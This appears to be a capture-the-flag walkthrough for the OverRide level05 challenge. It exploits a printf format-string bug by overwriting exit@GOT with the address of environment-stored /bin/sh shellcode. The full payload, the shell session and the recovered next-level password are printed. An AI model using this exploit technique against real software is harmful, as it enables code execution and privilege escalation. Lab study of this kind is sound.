# OverRide — Level05 Walkthrough

## Binary Analysis

The program behavior is:

- read user input with `fgets()`,
- convert input to lowercase,
- pass the input directly to `printf()`,
- call `exit(0)`.

Reconstructed logic:

```c
int main(void)
{
    int i = 0;
    char buf[100];

    fgets(&buf, 100, stdin);
    for (; *p; ++p) *p = tolower(*p);

    printf(buf);
    exit(0);
}
```

## Vulnerability

`printf(buf)` is a format-string vulnerability.

Because the program calls `exit()` right after printing, we can overwrite the GOT entry of `exit` and redirect execution to shellcode stored in an environment variable.

## Exploitation Strategy

1. Place shellcode in an environment variable (`SHELLCODE`).
2. Find the shellcode address.
3. Find `exit` GOT address.
4. Find the format-string stack offset.
5. Overwrite `exit@GOT` with the shellcode address using `%n` writes in two halves.

## Shellcode

Source used:

http://shell-storm.org/shellcode/files/shellcode-575.html

```text
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

Set shellcode in environment:

```bash
level05@OverRide:/tmp$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

## Find Shellcode Address

Using a small helper program (`main.c`, compiled in 32-bit mode):

```bash
level05@OverRide:/tmp$ ./a.out
env shellcode addr: 0xffffd890
```

## Find `exit` GOT Address

```bash
level05@OverRide:~$ objdump -R ./level05
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
080497e0 R_386_JUMP_SLOT   exit
...
```

So `exit@GOT = 0x080497e0`.

## Find Format Offset

Using a probing payload such as `AAAA` + ` %p` repeated, the format-string write offset is found at position **10**.

## Build Final Payload

To avoid printing billions of characters, write the target address in two 16-bit chunks:

- first write to `0x080497e0`,
- second write to `0x080497e2`.

Payload used:

```bash
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55432x" + "%10$n" + "%10095x" + "%11$n"'; cat) | ./level05
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## Result

Successfully gained access as `level06` and recovered the next level password.